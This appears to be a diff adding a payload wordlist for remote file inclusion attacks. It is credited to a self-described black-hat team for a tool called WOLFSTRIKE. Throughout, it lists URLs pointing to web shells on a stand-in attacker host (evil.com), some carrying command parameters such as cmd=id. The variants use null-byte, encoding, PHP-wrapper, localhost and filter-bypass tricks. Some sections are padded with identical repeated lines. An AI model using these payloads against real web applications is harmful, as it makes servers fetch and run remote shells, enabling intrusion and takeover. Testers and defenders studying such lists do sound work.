@@ -1,0 +1,116 @@
+# wordlists/rfi_payloads.txt
+# WOLFSTRIKE RFI Payloads
+# Author: ATHEX BLACK HAT | Team: Wolf Intelligence PK
+# Categories: Remote File Inclusion payloads
+
+# === BASIC RFI PAYLOADS ===
+http://evil.com/shell.txt
+https://evil.com/shell.txt
+http://evil.com/shell.php
+https://evil.com/shell.php
+http://evil.com/shell.txt?
+https://evil.com/shell.txt?
+http://evil.com/shell.txt%00
+https://evil.com/shell.txt%00
+ftp://evil.com/shell.txt
+ftps://evil.com/shell.txt
+//evil.com/shell.txt
+///evil.com/shell.txt
+http://evil.com/shell.txt?cmd=id
+http://evil.com/shell.php?cmd=whoami
+
+# === PHP SPECIFIC RFI ===
+http://evil.com/shell.txt
+http://evil.com/shell.txt?cmd=
+http://evil.com/shell.php
+http://evil.com/shell.php?cmd=
+http://evil.com/shell.gif
+http://evil.com/shell.jpg
+http://evil.com/shell.png
+http://evil.com/shell.txt%00.php
+http://evil.com/shell.txt?.php
+http://evil.com/shell.txt%23.php
+http://evil.com/shell.txt%3F.php
+
+# === URL ENCODED RFI ===
+http%3A%2F%2Fevil.com%2Fshell.txt
+%68%74%74%70%3A%2F%2Fevil.com%2Fshell.txt
+http://evil.com/shell.txt%20
+http://evil.com/shell.txt%09
+http://evil.com/shell.txt%0a
+http://evil.com/shell.txt%0d
+http://evil.com/shell.txt%0d%0a
+
+# === DOUBLE ENCODED RFI ===
+http%25253A%25252F%25252Fevil.com%25252Fshell.txt
+%252568%252574%252574%252570%25253A%25252F%25252Fevil.com%25252Fshell.txt
+
+# === RFI WITH NULL BYTE ===
+http://evil.com/shell.txt%00
+http://evil.com/shell.txt%00.html
+http://evil.com/shell.txt%00.php
+http://evil.com/shell.txt%00.jpg
+http://evil.com/shell.php%00.txt
+http://evil.com/shell.php%00.html
+
+# === RFI WITH QUESTION MARK ===
+http://evil.com/shell.txt?
+http://evil.com/shell.txt?param=value
+http://evil.com/shell.php?
+http://evil.com/shell.php?cmd=id&param=value
+
+# === RFI WITH HASH FRAGMENT ===
+http://evil.com/shell.txt%23
+http://evil.com/shell.txt%23fragment
+http://evil.com/shell.php%23
+http://evil.com/shell.php%23fragment
+
+# === RFI ALTERNATIVE PROTOCOLS ===
+ftp://evil.com/shell.txt
+ftps://evil.com/shell.txt
+sftp://evil.com/shell.txt
+ssh://evil.com/shell.txt
+gopher://evil.com/shell.txt
+dict://evil.com/shell.txt
+ldap://evil.com/shell.txt
+tftp://evil.com/shell.txt
+
+# === RFI WITH PHP WRAPPERS ===
+php://filter/convert.base64-decode/resource=http://evil.com/shell.txt
+compress.zlib://http://evil.com/shell.txt
+php://filter/resource=http://evil.com/shell.txt
+
+# === RFI LOCALHOST BYPASS ===
+http://127.0.0.1/shell.txt
+http://localhost/shell.txt
+http://0.0.0.0/shell.txt
+http://[::1]/shell.txt
+http://0177.0.0.1/shell.txt
+http://2130706433/shell.txt
+http://0x7f000001/shell.txt
+
+# === RFI WITH AUTHENTICATION ===
+http://user:pass@evil.com/shell.txt
+http://evil.com@user:pass/shell.txt
+http://evil.com/shell.txt@user:pass
+
+# === RFI ALTERNATIVE DOMAINS ===
+http://evil.com./shell.txt
+http://evil.com./shell.txt
+http://evil.com/shell.txt.
+http://evil%E3%80%82com/shell.txt
+http://evil。com/shell.txt
+
+# === RFI WAF BYPASS ===
+http://evil.com/shell.txt
+http://evil.com/shell.txt
+http://evil.com/shell.txt
+http://evil.com/shell.txt
+http://evil.com/shell.txt
+
+# === RFI WITH SHORT URLS ===
+http://bit.ly/shell
+http://tinyurl.com/shell
+http://is.gd/shell
+http://ow.ly/shell
+http://goo.gl/shell
